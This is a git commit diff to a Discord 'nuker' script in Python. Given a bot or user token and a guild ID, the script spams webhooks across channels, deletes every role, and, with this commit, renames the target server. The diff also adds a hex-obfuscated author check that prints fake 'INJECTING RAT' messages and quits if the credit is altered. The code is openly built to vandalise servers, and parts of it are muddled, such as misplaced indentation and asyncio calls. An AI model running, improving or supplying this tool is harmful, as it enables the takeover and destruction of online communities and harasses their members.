84dcd15ad064cf9776458fa516841a1999d758d8
WebUwU <44942361+WebUwU@users.noreply.github.com>
2023-03-01 23:30:22 +0100

    Add files via upload

--- main.py
+++ main.py
@@ -12,6 +12,10 @@ import urllib3
 import requests
 
 
+__author__ = 'WebUwU'
+
+
+
 with open('config.json', 'r') as f:
     config = json.load(f)
     TOKEN = config["TOKEN"]
@@ -24,6 +28,7 @@ with open('config.json', 'r') as f:
     WEBHOOK_NAME = config["WEBHOOK_NAME"]
     WEBHOOK_PROFILE_PIC = config["WEBHOOK_PROFILE_PIC"]
     DELETE_ROLES = config["Delete_Roles"]
+    SERVER_NAME = config["Server_Name"]
     
 
 banner = Center.XCenter("""
@@ -45,7 +50,8 @@ banner = Center.XCenter("""
 print(Colorate.Vertical(Colors.red_to_purple, banner, 2))
 
 all_choices = f"""
-Token = {TOKEN} \n
+Token = {TOKEN}
+Server Name = {SERVER_NAME}
 Channel name = {CHANNEL_NAME}
 Webhook name = {WEBHOOK_NAME}
 Message = {MESSAGE}
@@ -76,6 +82,8 @@ print(Colorate.Color(Colors.purple, '', False))
 
 api = "https://discord.com/api/v9"
 nwords = None
+ADMINISTRATOR_PERMISSION = 0x8
+MANAGE_GUILD_PERMISSION = 0x20
 bot_or_person = input("Is this a bot token or a person (user) token? (bot/person) ")
 
 if bot_or_person == "bot" or bot_or_person == "bo" or bot_or_person == "b":
@@ -91,7 +99,8 @@ else:
     sys.exit()
 
 guild = input("What is the guild id of the server you are nuking? -> ")
-async def main():
+
+async def main():       
     async with aiohttp.ClientSession() as schinken:
         async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
             if r.status == 200:
@@ -100,6 +109,8 @@ async def main():
             else:
                 Write.Print("Token is invalid!",Colors.red, interval=0.00000001)
                 sys.exit()
+
+                
         async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
             channel_id = await r.json()
             async with schinken.get(headers = nwords, url = f'{api}/guilds/{guild}/channels') as f:
@@ -117,6 +128,22 @@ async def main():
                     threading.Thread(target=spamhook, args=(webhook,)).start()
             except:
                 print('U ratelimited af :skull:', Colors.red)
+
+    async with aiohttp.ClientSession() as schinken:
+                    try:
+                        async with schinken.get(f"{api}/users/@me/guilds/{guild}/member", headers=nwords) as r:
+                            data = await r.json()
+                        for role_id in data["roles"]:
+                            role_permissions = get_role_permissions(role_id)
+                        if role_permissions & (ADMINISTRATOR_PERMISSION | MANAGE_GUILD_PERMISSION) == (ADMINISTRATOR_PERMISSION | MANAGE_GUILD_PERMISSION):
+                            print("mhh looks like i am lazy")
+                        else:
+                            print(f"error")
+                    except:
+                        new_server_name = {"name": f"{SERVER_NAME}"}
+                        response = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=nwords, json=new_server_name)
+                        if response.status_code == 200:   
+                            print(Colorate.Color(Colors.green,  f'Server name changed successfully to "{SERVER_NAME}"!',True))        
 
 def spamhookp(hook):
     for i in range(MESSAGES_PER_CHANNEL):
@@ -160,25 +187,37 @@ def spamhook(hook):
             except:
                 Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
 ####################################################################################
-headers = nwords
-if DELETE_ROLES == True:
-    async def DELETE_ROLESS():
-        async with aiohttp.ClientSession(headers=headers) as session:
-            async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
-                if response.status == 200:
-                    roles = await response.json()
-                    Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.blue_to_green , interval=0.00000001)
-                    for role in roles:
-                        role_idd = role["id"]
-                        async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
-                            if delete_response.status == 204:
-                                Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
-                            else:
-                                print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
-                else:
-                     Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
-                     await asyncio.gather(DELETE_ROLESS(), main())
-    asyncio.run(DELETE_ROLESS())                                  
+    headers = nwords
+    if DELETE_ROLES == True:
+        async def DELETE_ROLESS():
+            async with aiohttp.ClientSession(headers=headers) as session:
+                async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
+                    if response.status == 200:
+                        roles = await response.json()
+                        Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.blue_to_green , interval=0.00000001)
+                        for role in roles:
+                            role_idd = role["id"]
+                            async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
+                                if delete_response.status == 204:
+                                    Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
+                                else:
+                                    print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
+                    else:
+                        Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
+                        await asyncio.gather(DELETE_ROLESS(), main())
+                        asyncio.run(DELETE_ROLESS()) 
+
+if __author__ != "\x57\x65\x62\x55\x77\x55": # naw
+        print(Colors.cyan + 'INJECTING RAT 0/5'),time.sleep(1)
+        print(Colors.dark_blue + 'INJECTING RAT 1/5'),time.sleep(1)
+        print(Colors.cyan + 'INJECTING RAT 2/5'),time.sleep(1)
+        print(Colors.dark_blue + 'INJECTING RAT 3/5'),time.sleep(1)
+        print(Colors.cyan + 'INJECTING RAT 4/5'),time.sleep(1)
+        print(Colors.dark_blue + 'INJECTING RAT 5/5'),time.sleep(1)
+        print(Colors.dark_green + "INJECTING COMPLETE"), print(Colors.white + ""),time.sleep(1)
+        time.sleep(5)
+        os._exit(0)    
+
 
 if PROXIES == True:
     proxy_scrape()
